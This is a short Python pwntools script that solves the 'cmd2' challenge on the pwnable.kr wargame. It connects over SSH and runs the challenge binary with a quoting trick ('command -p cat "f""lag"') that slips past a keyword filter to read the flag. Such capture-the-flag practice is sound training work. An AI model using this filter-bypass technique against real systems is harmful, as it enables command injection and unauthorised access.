from pwn import *

import cmd1


def cmd2solve():
    s = ssh(host='pwnable.kr',
            port=2222,
            user='cmd2',
            password=cmd1.cmd1solve())

    sh = s.process(['cmd2', 'command -p cat "f""lag"'])
    sh.readline()
    return sh.readline().replace('\n', '')


if __name__ == "__main__":
    print(cmd2solve())
